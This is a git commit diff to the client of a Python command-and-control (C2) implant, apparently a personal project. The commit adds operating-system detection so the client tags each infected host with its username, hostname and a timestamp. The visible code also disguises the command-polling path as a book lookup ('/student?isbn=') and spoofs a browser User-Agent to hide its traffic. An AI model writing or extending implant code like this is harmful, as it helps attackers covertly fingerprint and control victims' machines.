bec363be3864068330dfb7d57cae7558ffb206dd
vincgonzo <vincgonzo@hotmail.fr>
2025-03-26 21:03:28 +0100

    dev(c2): client adapt os type for info

--- py_c2/client.py
+++ py_c2/client.py
@@ -3,18 +3,31 @@
 """
 C2 Client side code
 """
-import time
+import platform, socket, time
 from requests import get
 from os import getenv
+
 
 PORT=8900
 PROXY = None
 C2_SERVER = "localhost"
-
 CMD_REQUEST = "/student?isbn="
 
-# Windows user & env banner
-client = getenv("USERNAME") + "@" + getenv("COMPUTERNAME") + "_" + str(time())
+
+timestamp = str(int(time.time()))
+# Pb performing this HOSTNAME in Ubuntu
+hostname = getenv("HOSTNAME")
+if hostname is None:
+    hostname = socket.gethostname() 
+
+# Check the operating system
+if platform.system() == "Windows":
+    # Windows environment
+    client = getenv("USERNAME") + "@" + getenv("COMPUTERNAME") + "_" + timestamp
+else:
+    print(getenv("HOSTNAME"))
+    # Linux environment
+    client = getenv("USER") + "@" + hostname + "_" + timestamp
 
 HEADER: dict[str, str] = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
